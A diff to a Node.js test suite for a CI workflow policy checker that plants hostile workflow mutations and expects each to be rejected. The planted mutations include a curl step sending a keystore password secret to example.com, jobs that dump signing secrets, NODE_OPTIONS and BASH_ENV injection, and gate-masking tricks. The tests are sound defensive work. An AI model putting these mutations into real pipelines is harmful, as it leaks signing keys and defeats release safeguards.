@@ -15,6 +15,8 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 
 import {
+  GATE_COMMANDS,
+  INJECTION_KEYS,
   PINNED_ACTIONS,
   RELEASE_FILE,
   WORKFLOW_DIR,
@@ -196,7 +198,7 @@ test('a multiline uses: is normalized and still checked', () => {
   );
 });
 
-test('only commits on the allowlist may run, and local actions are data', () => {
+test('only commits on the allowlist may run, and local actions are rejected', () => {
   const unknown = VALID.replace(`actions/checkout@${CHECKOUT_SHA}`, `some/unknown-action@${CHECKOUT_SHA}`);
   assert.ok(checkWorkflow(unknown, { file: 'example.yml' }).some((finding) => /not on the pinned action allowlist/.test(finding)));
   const wrongSha = VALID.replace(CHECKOUT_SHA, '0'.repeat(40));
@@ -209,11 +211,14 @@ test('only commits on the allowlist may run, and local actions are data', () => 
       `${reference} is rejected`
     );
   }
-  assert.deepEqual(
-    checkWorkflow(VALID.replace(`uses: actions/checkout@${CHECKOUT_SHA}`, 'uses: ./.github/actions/local'), { file: 'example.yml' }),
-    [],
-    'a local action is repository data and runs checked-out code by definition'
-  );
+  for (const reference of ['./.github/actions/local', './pr/.evil']) {
+    assert.ok(
+      checkWorkflow(VALID.replace(`uses: actions/checkout@${CHECKOUT_SHA}`, `uses: ${reference}`), { file: 'example.yml' }).some((finding) =>
+        /must not run a local action/.test(finding)
+      ),
+      `${reference} runs repository code and is rejected`
+    );
+  }
 });
 
 test('a checkout never persists credentials', () => {
@@ -332,14 +337,376 @@ test('gate steps are exact commands and cannot be masked', async (t) => {
       ),
       /must not set continue-on-error/,
     ],
-    ['echo replacement', checks.replace('run: npm run test:unit', 'run: echo "npm run test:unit"'), /must run exactly one step containing/],
-    ['missing npm ci', checks.replace('      - name: Install the one dev-only dependency\n        run: npm ci\n', ''), /job "web".*npm ci/],
+    ['echo replacement', checks.replace('run: npm run test:unit', 'run: echo "npm run test:unit"'), /must run exactly these commands/],
+    ['missing npm ci', checks.replace('      - name: Install the one dev-only dependency\n        run: npm ci\n', ''), /must run exactly these commands/],
+    ['missing gate', checks.replace('run: node scripts/check-required.mjs', 'run: echo done'), /must run exactly these commands/],
+    // A dead branch, a here-doc, a pipeline, a subshell, a brace group and a
+    // shell wrapper all execute something other than the registered command.
+    [
+      'dead if',
+      checks.replace(
+        '        run: node scripts/check-required.mjs',
+        '        run: |\n          if false; then\n            node scripts/check-required.mjs\n          fi'
+      ),
+      /gate step must run only the registered commands|must run exactly these commands/,
+    ],
+    [
+      'here-doc',
+      checks.replace(
+        '        run: node scripts/check-required.mjs',
+        "        run: |\n          cat > /dev/null <<'EOF'\n          node scripts/check-required.mjs\n          EOF"
+      ),
+      /gate step must run only the registered commands|must run exactly these commands/,
+    ],
+    ['pipe cat', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs | cat'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['path true', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || /bin/true'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['subshell', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || (exit 0)'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['brace group', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || { true; }'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['sh -c', checks.replace('run: node scripts/check-required.mjs', "run: node scripts/check-required.mjs || sh -c 'exit 0'"), /gate step must run only the registered commands|must run exactly these commands/],
+    ['redirection', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs > /dev/null'), /gate step must run only the registered commands|must run exactly these commands/],
   ];
   for (const [name, text, pattern] of cases) {
     const findings = checkWorkflow(text, { file: 'checks.yml' });
     assert.ok(findings.some((finding) => pattern.test(finding)), `${name}: ${findings.join(' | ')}`);
     assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': text }), 0, `${name}: the CLI exits nonzero`);
   }
+});
+
+test('only release.yml sign may use the release environment or read a secret', async (t) => {
+  const files = await real();
+  const checks = files['checks.yml'];
+  const release = files[RELEASE_FILE];
+  const cases = [
+    ['web environment', 'checks.yml', checks.replace('  web:\n', '  web:\n    environment: release\n')],
+    ['policy environment', 'checks.yml', checks.replace('  policy:\n', '  policy:\n    environment: release\n')],
+    [
+      'new job environment',
+      'checks.yml',
+      checks.replace(
+        '  required:\n',
+        '  steal:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    environment: release\n    steps:\n      - run: echo steal\n  required:\n'
+      ),
+    ],
+    ['publish environment', RELEASE_FILE, release.replace('  publish:\n    name: publish', '  publish:\n    environment: release\n    name: publish')],
+    [
+      'web secret in run',
+      'checks.yml',
+      checks.replace(
+        '      - name: Privacy gate\n        run: npm run privacy:check',
+        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Privacy gate\n        run: npm run privacy:check'
+      ),
+    ],
+    [
+      'policy secret in run',
+      'checks.yml',
+      checks.replace(
+        '      - name: Workflow policy and privacy on the candidate tree',
+        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Workflow policy and privacy on the candidate tree'
+      ),
+    ],
+    [
+      'build secret in run',
+      RELEASE_FILE,
+      release.replace(
+        '        run: npm run verify:all',
+        '        run: npm run verify:all && curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/'
+      ),
+    ],
+  ];
+  for (const [name, file, text] of cases) {
+    const findings = checkWorkflow(text, { file });
+    assert.ok(
+      findings.some((finding) => /must not use the release environment|must not read secrets/.test(finding)),
+      `${name}: ${findings.join(' | ')}`
+    );
+    assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
+  }
+
+  // The one real grant stays: sign uses the release environment and secrets.
+  const sign = parseWorkflow(release).workflow.jobs.sign;
+  assert.equal(sign.environment, 'release');
+  assert.match(JSON.stringify(sign), /secrets\.ANDROID_KEYSTORE_BASE64/);
+  assert.equal(await runPolicy(t, files), 0, 'the real tree is the positive control');
+});
+
+test('the trusted jobs run no local action and the owned workflow set is closed', async (t) => {
+  const files = await real();
+  const checks = files['checks.yml'];
+  for (const [job, anchor, replacement] of [
+    [
+      'policy',
+      '      - name: Workflow policy and privacy on the candidate tree',
+      '      - name: Evil\n        uses: ./pr/.evil\n      - name: Workflow policy and privacy on the candidate tree',
+    ],
+    ['required', '      - name: Every leg must have succeeded', '      - name: Evil\n        uses: ./.evil\n      - name: Every leg must have succeeded'],
+  ]) {
+    const text = checks.replace(anchor, replacement);
+    assert.ok(
+      checkWorkflow(text, { file: 'checks.yml' }).some((finding) => /must not run a local action/.test(finding)),
+      `${job} rejects a local action`
+    );
+    assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': text }), 0, `${job}: the CLI exits nonzero`);
+  }
+
+  const secondRelease = `name: Release Again
+on:
+  workflow_run:
+    workflows: [Checks]
+    types: [completed]
+permissions:
+  contents: write
+  id-token: write
+concurrency:
+  group: release
+  cancel-in-progress: false
+jobs:
+  sign:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    environment: release
+    steps:
+      - name: Checkout
+        uses: actions/checkout@${CHECKOUT_SHA}
+        with:
+          persist-credentials: false
+      - name: Steal
+        run: |
+          printf '%s' "\${{ secrets.ANDROID_KEYSTORE_BASE64 }}" > key.b64
+          gh release create v1.0.3 --generate-notes
+`;
+  assert.notEqual(await runPolicy(t, { ...files, 'release.yaml': secondRelease }), 0, 'a second release workflow fails');
+  assert.notEqual(
+    await runPolicy(t, {
+      ...files,
+      'steal.yml': 'name: Steal\non: push\npermissions:\n  contents: read\nconcurrency:\n  group: steal\njobs:\n  steal:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: echo steal\n',
+    }),
+    0,
+    'an unowned workflow fails'
+  );
+  const rest = { ...files };
+  delete rest['stale.yml'];
+  assert.notEqual(await runPolicy(t, rest), 0, 'a missing owned workflow fails');
+  assert.equal(await runPolicy(t, files), 0, 'the exact owned set passes');
+});
+
+test('both unprivileged jobs create the one throwaway key before the build', async (t) => {
+  const releaseText = await readFile(join(projectRoot, WORKFLOW_DIR, RELEASE_FILE), 'utf8');
+  const checksText = await readFile(join(projectRoot, WORKFLOW_DIR, 'checks.yml'), 'utf8');
+  const parsed = (text) => parseWorkflow(text).workflow;
+  for (const [file, job] of [
+    ['checks.yml', parsed(checksText).jobs.android],
+    [RELEASE_FILE, parsed(releaseText).jobs.build],
+  ]) {
+    const commands = job.steps.map((step) => step.run ?? '').filter(Boolean);
+    const keystore = commands.findIndex((run) => run.includes('node scripts/ci-keystore.mjs'));
+    const build = commands.findIndex((run) => run.includes('npm run build:android'));
+    assert.ok(keystore >= 0, `${file}: the keystore step exists`);
+    assert.ok(build > keystore, `${file}: the key is created before the build`);
+    assert.equal(commands.filter((run) => run.includes('node scripts/ci-keystore.mjs')).length, 1, `${file}: called once`);
+  }
+  assert.ok(GATE_COMMANDS['checks.yml'].android.includes('node scripts/ci-keystore.mjs'));
+  assert.doesNotMatch(JSON.stringify(parsed(releaseText).jobs.sign), /ci-keystore|ANDROID_ALLOW_TEST_KEY/);
+  assert.doesNotMatch(releaseText, /ci-throwaway-not-a-release-key/);
+  assert.doesNotMatch(checksText, /ci-throwaway-not-a-release-key/);
+
+  // Removing or reordering the owner is a policy finding, not a silent
+  // "CI=true with no key" failure at release time.
+  const files = await real();
+  const mutations = {
+    'checks keystore removed': {
+      'checks.yml': checksText.replace('        run: node scripts/ci-keystore.mjs', '        run: echo no-key'),
+    },
+    'release keystore removed': {
+      [RELEASE_FILE]: releaseText.replace('        run: node scripts/ci-keystore.mjs', '        run: echo no-key'),
+    },
+    'release keystore moved after the build': {
+      [RELEASE_FILE]: releaseText
+        .replace('        run: node scripts/ci-keystore.mjs', '        run: echo moved')
+        .replace(
+          '        run: npm run build:android',
+          '        run: npm run build:android\n      - name: Create a throwaway signing key\n        working-directory: ${{ env.RELEASE_TREE }}\n        run: node scripts/ci-keystore.mjs'
+        ),
+    },
+  };
+  for (const [name, replacement] of Object.entries(mutations)) {
+    assert.notEqual(await runPolicy(t, { ...files, ...replacement }), 0, `${name}: the CLI exits nonzero`);
+  }
+
+  const hardcoded = checksText.replace(
+    '        run: node scripts/ci-keystore.mjs',
+    '        run: echo ci-throwaway-not-a-release-key > pass.txt'
+  );
+  assert.ok(
+    checkWorkflow(hardcoded, { file: 'checks.yml' }).some((finding) => /must not hardcode the CI throwaway password/.test(finding)),
+    'the password has one owner'
+  );
+  assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': hardcoded }), 0);
+});
+
+test('trusted wiring, injection, permissions and release authority reject every planted mutation', async (t) => {
+  const files = await real();
+  const checks = files['checks.yml'];
+  const release = files[RELEASE_FILE];
+  const cases = [
+    // A2-V1: job-level continue-on-error.
+    ['required continue-on-error', 'checks.yml', checks.replace('  required:\n', '  required:\n    continue-on-error: true\n'), /job "required" must not set continue-on-error/],
+    ['web continue-on-error', 'checks.yml', checks.replace('  web:\n', '  web:\n    continue-on-error: true\n'), /job "web" must not set continue-on-error/],
+    ['build continue-on-error', RELEASE_FILE, release.replace('  build:\n', '  build:\n    continue-on-error: true\n'), /job "build" must not set continue-on-error/],
+    // A2-V2/F9: trusted checkout refs and paths.
+    [
+      'policy checkout pr head',
+      'checks.yml',
+      checks.replace('          ref: main\n          persist-credentials: false\n      - name: Use the pinned Node', '          ref: ${{ github.event.pull_request.head.sha }}\n          persist-credentials: false\n      - name: Use the pinned Node'),
+      /with: must be exactly/,
+    ],
+    [
+      'required checkout pr head',
+      'checks.yml',
+      checks.replace('          ref: main\n          persist-credentials: false\n          fetch-depth: 1', '          ref: ${{ github.event.pull_request.head.sha }}\n          persist-credentials: false\n          fetch-depth: 1'),
+      /with: must be exactly/,
+    ],
+    [
+      'policy checkout fork repository',
+      'checks.yml',
+      checks.replace('          ref: main\n          persist-credentials: false\n      - name: Use the pinned Node', '          repository: ${{ github.event.pull_request.head.repo.full_name }}\n          ref: main\n          persist-credentials: false\n      - name: Use the pinned Node'),
+      /with: must be exactly/,
+    ],
+    [
+      'required checkout moved path',
+      'checks.yml',
+      checks.replace('          ref: main\n          persist-credentials: false\n          fetch-depth: 1', '          ref: main\n          path: trusted\n          persist-credentials: false\n          fetch-depth: 1'),
+      /with: must be exactly/,
+    ],
+    ['PR_TREE workspace', 'checks.yml', checks.replace(/          PR_TREE: .*\n/, '          PR_TREE: ${{ github.workspace }}\n'), /env: must be exactly/],
+    [
+      'gate step condition',
+      'checks.yml',
+      checks.replace('      - name: Workflow policy and privacy on the candidate tree\n        env:', "      - name: Workflow policy and privacy on the candidate tree\n        if: false\n        env:"),
+      /condition must be|must not set if/,
+    ],
+    // A2-V3/F6: env injection at every level.
+    ['workflow NODE_OPTIONS', 'checks.yml', checks.replace('permissions:\n', 'env:\n  NODE_OPTIONS: --require ./pr/scripts/evil.cjs\npermissions:\n'), /workflow env must not set NODE_OPTIONS/],
+    ['job BASH_ENV', 'checks.yml', checks.replace('  policy:\n', '  policy:\n    env:\n      BASH_ENV: ./pr/scripts/evil.sh\n'), /job "policy" env must not set BASH_ENV/],
+    [
+      'step GITHUB_OUTPUT',
+      'checks.yml',
+      checks.replace('        env:\n          PR_TREE:', '        env:\n          GITHUB_OUTPUT: ./pr/out\n          PR_TREE:'),
+      /step env must not set GITHUB_OUTPUT/,
+    ],
+    // A2-V4/V5: the worktree and the upload path.
+    ['materialize main', RELEASE_FILE, release.replace('git worktree add --detach "$worktree" "$REF"', 'git worktree add --detach "$worktree" main'), /must materialize "\$REF"/],
+    [
+      'HEAD step removed',
+      RELEASE_FILE,
+      release.replace(/- name: Prove the worktree is the resolved commit[\s\S]*?run: test "\$\(git rev-parse HEAD\)" = "\$SHA"\n/, ''),
+      /must run exactly these commands|must have exactly/,
+    ],
+    [
+      'HEAD step moved out of the worktree',
+      RELEASE_FILE,
+      release.replace(
+        '        working-directory: ${{ env.RELEASE_TREE }}\n        run: test "$(git rev-parse HEAD)" = "$SHA"',
+        '        run: test "$(git rev-parse HEAD)" = "$SHA"'
+      ),
+      /must run .*git rev-parse HEAD.* in the resolved worktree/,
+    ],
+    ['upload dist/*', RELEASE_FILE, release.replace('          path: ${{ env.RELEASE_TREE }}/dist/*', '          path: dist/*'), /upload path must be exactly/],
+    // A2-V6: source in sign and publish.
+    ['sign source', RELEASE_FILE, release.replace("          trap 'rm -f", '          . dist/notes.md\n          trap \'rm -f'), /must not source a file/],
+    [
+      'publish source',
+      RELEASE_FILE,
+      release.replace('          for file in "$apk" "$checksum" "$bundle" "$notes"; do test -f "$file"; done', '          . "$notes"\n          for file in "$apk" "$checksum" "$bundle" "$notes"; do test -f "$file"; done'),
+      /must not source a file/,
+    ],
+    // F5: trusted step shape.
+    [
+      'policy extra step',
+      'checks.yml',
+      checks.replace(
+        '      - name: Workflow policy and privacy on the candidate tree',
+        '      - name: Replace the parser\n        run: cp pr/scripts/check-workflows.mjs scripts/check-workflows.mjs\n      - name: Workflow policy and privacy on the candidate tree'
+      ),
+      /must have exactly 6 steps/,
+    ],
+    [
+      'policy working-directory',
+      'checks.yml',
+      checks.replace('      - name: Workflow policy and privacy on the candidate tree\n        env:', '      - name: Workflow policy and privacy on the candidate tree\n        working-directory: pr\n        env:'),
+      /must not set working-directory/,
+    ],
+    ['policy defaults', 'checks.yml', checks.replace('  policy:\n', "  policy:\n    defaults:\n      run:\n        shell: bash -c 'exit 0' {0}\n"), /must not declare defaults/],
+    ['policy container', 'checks.yml', checks.replace('  policy:\n', '  policy:\n    container: node:22\n'), /must not declare container/],
+    ['workflow defaults', 'checks.yml', checks.replace('permissions:\n', "defaults:\n  run:\n    shell: bash -c 'exit 0' {0}\npermissions:\n"), /workflow-level defaults/],
+    // F10: exact conditions.
+    [
+      'resolve if or true',
+      RELEASE_FILE,
+      release.replace("       github.event.workflow_run.conclusion == 'success')", "       github.event.workflow_run.conclusion == 'success') || true"),
+      /job "resolve" if: must be exactly/,
+    ],
+    [
+      'publish if dispatch',
+      RELEASE_FILE,
+      release.replace("    if: needs.resolve.outputs.publish == 'true'\n    runs-on: ubuntu-24.04", "    if: needs.resolve.outputs.publish == 'true' || github.event_name == 'workflow_dispatch'\n    runs-on: ubuntu-24.04"),
+      /job "publish" if: must be exactly/,
+    ],
+    // F11: the tag source.
+    ['publish tag ref_name', RELEASE_FILE, release.replace('      TAG: ${{ needs.resolve.outputs.tag }}\n      VERSION:', '      TAG: ${{ github.ref_name }}\n      VERSION:'), /env TAG must be exactly/],
+    ['publish tag literal', RELEASE_FILE, release.replace('      TAG: ${{ needs.resolve.outputs.tag }}\n      VERSION:', '      TAG: v1.0.2\n      VERSION:'), /env TAG must be exactly/],
+    // F12: permissions.
+    ['checks contents write', 'checks.yml', checks.replace('permissions:\n  contents: read', 'permissions:\n  contents: write'), /top-level permissions must be exactly/],
+    ['required permissions write', 'checks.yml', checks.replace('  required:\n', '  required:\n    permissions:\n      contents: write\n'), /job "required" permissions must be exactly/],
+    [
+      'web github token',
+      'checks.yml',
+      checks.replace('      - name: Privacy gate\n        run: npm run privacy:check', '      - name: Privacy gate\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: npm run privacy:check'),
+      /must not read github.token/,
+    ],
+    // F13: publish command allowlist.
+    [
+      'publish upload clobber',
+      RELEASE_FILE,
+      release.replace('          gh release create "$TAG" \\', '          gh release upload "$TAG" dist/x --clobber\n          gh release create "$TAG" \\'),
+      /must not run gh release upload/,
+    ],
+    [
+      'publish gh api',
+      RELEASE_FILE,
+      release.replace('          gh release create "$TAG" \\', '          gh api -X DELETE "repos/$GITHUB_REPOSITORY/releases/1"\n          gh release create "$TAG" \\'),
+      /may only run gh release/,
+    ],
+    // F14: concurrency.
+    ['checks release group', 'checks.yml', checks.replace('  group: checks-${{ github.workflow }}-${{ github.ref }}', '  group: release'), /concurrency group must be exactly/],
+    // N8: the runner image.
+    ['required windows', 'checks.yml', checks.replace('  required:\n    name: required\n    if: always()', '  required:\n    name: required\n    runs-on: windows-latest\n    if: always()').replace('    runs-on: ubuntu-24.04\n    timeout-minutes: 5', '    timeout-minutes: 5'), /must run on ubuntu-24.04/],
+    ['policy macos', 'checks.yml', checks.replace('  policy:\n    name: policy (trusted gate)\n    runs-on: ubuntu-24.04', '  policy:\n    name: policy (trusted gate)\n    runs-on: macos-latest'), /must run on ubuntu-24.04/],
+  ];
+  for (const [name, file, text, pattern] of cases) {
+    assert.notEqual(text, file === 'checks.yml' ? checks : release, `${name}: the mutation applies`);
+    const findings = checkWorkflow(text, { file });
+    const releaseFindings = file === RELEASE_FILE ? checkReleaseWorkflow(text, { file }) : [];
+    assert.ok(
+      [...findings, ...releaseFindings].some((finding) => pattern.test(finding)),
+      `${name}: ${[...findings, ...releaseFindings].join(' | ')}`
+    );
+    assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
+  }
+  assert.equal(await runPolicy(t, files), 0, 'the real tree passes');
+});
+
+test('every injection variable is rejected at job level', async (t) => {
+  const files = await real();
+  const checks = files['checks.yml'];
+  for (const key of INJECTION_KEYS) {
+    const text = checks.replace('  policy:\n', `  policy:\n    env:\n      ${key}: /tmp/evil\n`);
+    assert.ok(
+      checkWorkflow(text, { file: 'checks.yml' }).some((finding) => finding.includes(`must not set ${key}`)),
+      `${key} is rejected`
+    );
+    assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': text }), 0, `${key}: the CLI exits nonzero`);
+  }
+  assert.equal(await runPolicy(t, files), 0, 'the real tree sets none of them');
 });
 
 test('the release parser reads one real publish command and rejects decoys', async () => {
@@ -386,11 +753,11 @@ test('the release authority is main-defined, split and tag-derived', async () =>
   assert.doesNotMatch(commands, /head_branch/, 'a tag that points at main HEAD does not need head_branch');
   assert.match(commands, /git merge-base --is-ancestor/, 'ancestry is checked in the main-defined workflow');
   assert.match(commands, /package\.json/, 'the tag matches the package version');
-  assert.match(commands, /gh release view/, 'an existing release is detected');
   assert.match(commands, /publish=true requires a release tag/, 'a SHA dry run cannot publish');
   assert.match(commands, /40-character SHA/, 'a short SHA is refused with a clear message');
   assert.equal(resolve.environment, undefined, 'the resolve job has no environment');
-  assert.deepEqual(Object.keys(resolve.outputs).sort(), ['existing', 'publish', 'ref', 'sha', 'tag', 'version']);
+  assert.deepEqual(Object.keys(resolve.outputs).sort(), ['publish', 'ref', 'sha', 'tag', 'version']);
+  assert.doesNotMatch(JSON.stringify(resolve), /gh release view/, 'resolve computes no dead existing release flag');
   const resolveIf = String(resolve.if).replace(/\s+/g, ' ');
   assert.match(resolveIf, /github\.event_name == 'workflow_dispatch'/, 'a manual dispatch is explicit');
   assert.match(resolveIf, /github\.event\.workflow_run\.event == 'push'/, 'a pull request Checks run cannot publish');
@@ -404,7 +771,7 @@ test('the release authority is main-defined, split and tag-derived', async () =>
     release.replace("github.event.workflow_run.event == 'push'", "github.event.workflow_run.event != 'never'"),
   ]) {
     assert.ok(
-      checkReleaseWorkflow(mutated, { file: RELEASE_FILE }).some((finding) => /job "resolve" must only run|must handle a manual dispatch|must require the push/.test(finding)),
+      checkReleaseWorkflow(mutated, { file: RELEASE_FILE }).some((finding) => /job "resolve" must only run|must handle a manual dispatch|must require the push|job "resolve" if: must be exactly/.test(finding)),
       'the resolve trigger guard is mandatory'
     );
   }
@@ -450,11 +817,28 @@ test('the release authority is main-defined, split and tag-derived', async () =>
   assert.match(JSON.stringify(sign.env), /vars\.RELEASE_CERT_SHA256/);
   assert.match(JSON.stringify(sign.steps), /vars\.ANDROID_KEY_ALIAS/);
   assert.doesNotMatch(JSON.stringify(sign.steps), /secrets\.ANDROID_KEY_ALIAS/);
+  // The signing toolchain is the same gate-proved JDK as the build.
+  assert.ok(
+    sign.steps.some((step) => step.uses === 'actions/setup-java@d1374f8ac74474200d16ef8ecee22c7ae7a51880' && step.with?.['java-version'] === '21')
+  );
+  // The signing scheme and the exact artifact identity come from the build's
+  // one owners; the sign job does not hard-code a second answer.
+  assert.match(JSON.stringify(sign), /--min-sdk-version \\"\$min_sdk\\"/);
+  assert.match(JSON.stringify(sign), /--v1-signing-enabled \\"\$v1_signing\\"/);
+  assert.doesNotMatch(JSON.stringify(sign), /--min-sdk-version 26/);
+  assert.doesNotMatch(JSON.stringify(sign), /--v1-signing-enabled false/);
+  assert.match(JSON.stringify(sign), /expected_version_code/);
+  // The attestation is bound to the resolved tag commit, and the bundle is
+  // checked against that binding.
+  const attest = sign.steps.find((step) => String(step.uses ?? '').startsWith('actions/attest-build-provenance@'));
+  assert.equal(attest.env.GITHUB_SHA, '${{ needs.resolve.outputs.sha }}');
+  assert.ok(sign.steps.some((step) => String(step.run ?? '').includes('.predicate.buildDefinition.resolvedDependencies')));
 
   // Publish holds contents: write and no secret, checks nothing out and uses TAG.
   const publish = parsed.jobs.publish;
   assert.deepEqual(publish.permissions, { contents: 'write' });
   assert.equal(publish.environment, undefined);
+  assert.equal(publish.env.GH_REPO, '${{ github.repository }}', 'gh can resolve the repository without a checkout');
   assert.doesNotMatch(JSON.stringify(publish.steps.map((step) => step.uses ?? '')), /actions\/checkout/);
   assert.equal(publishCommands(release).length, 1);
   assert.ok(publishCommands(release)[0].includes('$TAG'));
@@ -467,11 +851,15 @@ test('the release build proves a clean unsigned tree and the sign job proves the
   const checks = files['checks.yml'];
   assert.match(release, /npm run verify:all/);
   assert.match(release, /release-notes\.mjs --tag "\$TAG" --commit "\$SHA" --out dist\/notes\.md/);
-  assert.match(release, /ANDROID_ALLOW_TEST_KEY: 'true'/);
+  assert.match(release, /node scripts\/ci-keystore\.mjs/);
+  assert.doesNotMatch(release, /ANDROID_ALLOW_TEST_KEY/);
   assert.match(release, /node scripts\/check-apk\.mjs/);
   assert.match(release, /git diff --exit-code/);
   assert.match(release, /git status --porcelain/);
-  assert.match(release, /--v1-signing-enabled false/);
+  assert.match(release, /--min-sdk-version "\$min_sdk"/);
+  assert.match(release, /--v1-signing-enabled "\$v1_signing"/);
+  assert.doesNotMatch(release, /--min-sdk-version 26/);
+  assert.doesNotMatch(release, /--v1-signing-enabled false/);
   assert.match(release, /--v2-signing-enabled true/);
   assert.match(release, /--v3-signing-enabled true/);
   assert.match(release, /zipalign" -c -v 4/);
@@ -480,9 +868,15 @@ test('the release build proves a clean unsigned tree and the sign job proves the
   assert.match(release, /RELEASE_CERT_SHA256/);
   assert.match(release, /gh attestation download/);
   assert.match(release, /subject-path: dist\/drypoint-\$\{\{ needs\.resolve\.outputs\.version \}\}\.apk/, 'the signed APK is the subject');
+  assert.match(release, /GITHUB_SHA: \$\{\{ needs\.resolve\.outputs\.sha \}\}/, 'the attestation names the resolved tag commit');
+  assert.match(release, /\.predicate\.resolvedDependencies/, 'the downloaded predicate is verified');
   assert.match(release, /gh release view "\$TAG"/);
   assert.match(release, /cmp -s/);
   assert.match(release, /already exists with these exact assets/);
+  assert.match(release, /gh release edit "\$TAG" --notes-file "\$notes"/, 'a re-run refreshes a changed body');
+  assert.match(release, /GH_REPO: \$\{\{ github\.repository \}\}/);
+  assert.match(release, /dist\/version-code\.txt/);
+  assert.match(release, /dist\/signing\.json/);
   // The gate's artifact check asserts the schemes; the release sign job has its
   // own workflow-owned assertions because it must not run this script with the
   // key in its environment.
@@ -574,6 +968,36 @@ test('every planted bypass exits nonzero and the real tree passes', async (t) =>
     },
     'or true': { 'checks.yml': checks.replace('run: npm run test:unit', 'run: npm run test:unit || true') },
     'semicolon true': { 'checks.yml': checks.replace('run: npm run test:unit', 'run: npm run test:unit; true') },
+    'dead if': {
+      'checks.yml': checks.replace(
+        '        run: node scripts/check-required.mjs',
+        '        run: |\n          if false; then\n            node scripts/check-required.mjs\n          fi'
+      ),
+    },
+    'here-doc': {
+      'checks.yml': checks.replace(
+        '        run: node scripts/check-required.mjs',
+        "        run: |\n          cat > /dev/null <<'EOF'\n          node scripts/check-required.mjs\n          EOF"
+      ),
+    },
+    'pipe cat': { 'checks.yml': checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs | cat') },
+    'path true': { 'checks.yml': checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || /bin/true') },
+    'environment release on web': { 'checks.yml': checks.replace('  web:\n', '  web:\n    environment: release\n') },
+    'secret in a non-sign run': {
+      'checks.yml': checks.replace(
+        '      - name: Workflow policy and privacy on the candidate tree',
+        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Workflow policy and privacy on the candidate tree'
+      ),
+    },
+    'local action in policy': {
+      'checks.yml': checks.replace(
+        '      - name: Workflow policy and privacy on the candidate tree',
+        '      - name: Evil\n        uses: ./pr/.evil\n      - name: Workflow policy and privacy on the candidate tree'
+      ),
+    },
+    'second release workflow': {
+      'release.yaml': `name: Release Again\non:\n  workflow_run:\n    workflows: [Checks]\n    types: [completed]\npermissions:\n  contents: write\nconcurrency:\n  group: release\n  cancel-in-progress: false\njobs:\n  sign:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 30\n    environment: release\n    steps:\n      - run: echo "\${{ secrets.ANDROID_KEYSTORE_BASE64 }}"\n`,
+    },
     'continue-on-error': {
       'checks.yml': checks.replace(
         '      - name: Unit test suite (the browser suites have their own job)\n        run: npm run test:unit',
@@ -718,7 +1142,8 @@ test('checks.yml runs every gate and proves the APK identity', async () => {
   assert.match(checks, /brand\.json'\)\.appId/);
   assert.match(checks, /--version-code/);
   assert.match(checks, /versionCode='\$\{version_code\}'/);
-  assert.match(checks, /ANDROID_ALLOW_TEST_KEY: 'true'/);
+  assert.match(checks, /run: node scripts\/ci-keystore\.mjs/);
+  assert.doesNotMatch(checks, /ANDROID_ALLOW_TEST_KEY/);
 
   // The Android build must leave no tracked or untracked file, like the web job.
   const androids = checks.indexOf('  android:');
@@ -731,14 +1156,27 @@ test('checks.yml runs every gate and proves the APK identity', async () => {
   assert.ok(status > diff, 'the untracked-file proof follows the tracked-file proof');
 });
 
-test('actionlint is downloaded directly and checksum-verified', async () => {
+test('actionlint is downloaded directly, checksum-verified and in the required aggregate', async () => {
   const actionlint = await readFile(join(projectRoot, WORKFLOW_DIR, 'actionlint.yml'), 'utf8');
-  assert.match(actionlint, /actionlint_1\.7\.12_linux_amd64\.tar\.gz/);
-  assert.match(actionlint, /8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8/);
-  assert.match(actionlint, /sha256sum -c -/);
-  assert.match(actionlint, /tar -xzf/);
-  assert.match(actionlint, /run: actionlint -color/);
+  const script = await readFile(join(projectRoot, 'scripts', 'actionlint.sh'), 'utf8');
+  assert.match(script, /^version=1\.7\.12$/m);
+  assert.match(script, /actionlint_\$\{version\}_linux_amd64\.tar\.gz/);
+  assert.match(script, /8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8/);
+  assert.match(script, /sha256sum -c -/);
+  assert.match(script, /tar -xzf/);
+  assert.match(script, /RUNNER_TEMP:\?/);
+  assert.match(actionlint, /run: bash scripts\/actionlint\.sh \.github\/workflows/);
+  assert.doesNotMatch(actionlint, /actionlint_1\.7\.12/);
+  assert.doesNotMatch(actionlint, /8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8/);
   assert.doesNotMatch(actionlint, /raven-actions\/actionlint/);
+
+  // The trusted policy job runs the same owner against the candidate tree, and
+  // `required` needs `policy`, so a lint error blocks the merge.
